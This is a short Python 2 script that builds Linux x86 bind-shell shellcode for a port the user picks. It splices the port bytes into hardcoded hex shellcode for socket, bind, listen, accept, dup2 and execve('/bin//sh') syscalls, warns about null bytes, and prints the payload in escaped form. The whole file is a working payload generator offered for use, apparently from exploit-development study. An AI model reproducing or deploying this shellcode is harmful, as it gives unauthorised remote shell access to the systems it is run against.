#!/usr/bin/python
# filename: bind-generator.py

import sys

try:

    if 1 <= int(sys.argv[1]) <= 65535:

        shellcode_partone = "31c066b8670131db31c931d2b302b101cd8089c331c066b8690189e55252526668"

        port = "{0:#0{1}x}".format(int(sys.argv[1]),6) #e.g 4444 will be turned into '0x115c' or 12 to '0x000c'

        port_first_half = port[2:4]
        port_second_half = port[4:6]

        if port_first_half == "00" or port_second_half == "00":
            print "WARNING: Nulls in shellcode, use different port"

        shellcode_parttwo = "666a0289e129e589eacd8031c066b86b0131c9b101cd8031c066b86c0189e15289e231f6cd8089c331c9b10331c0b03f49cd8075f731c031db31c931d2b00b53682f2f7368682f62696e89e35289e25389e1cd80" 

        shellcode = shellcode_partone + port_first_half + port_second_half + shellcode_parttwo

        xformat_shellcode = "\\x" + "\\x".join(shellcode[n:n+2] for n in range(0, len(shellcode), 2))

        print "Bind shellcode for port " + sys.argv[1] + ': \r\n' + xformat_shellcode
    
    else:

        print "Invalid port number, try again"

except:

    print "Something went wrong, try again"

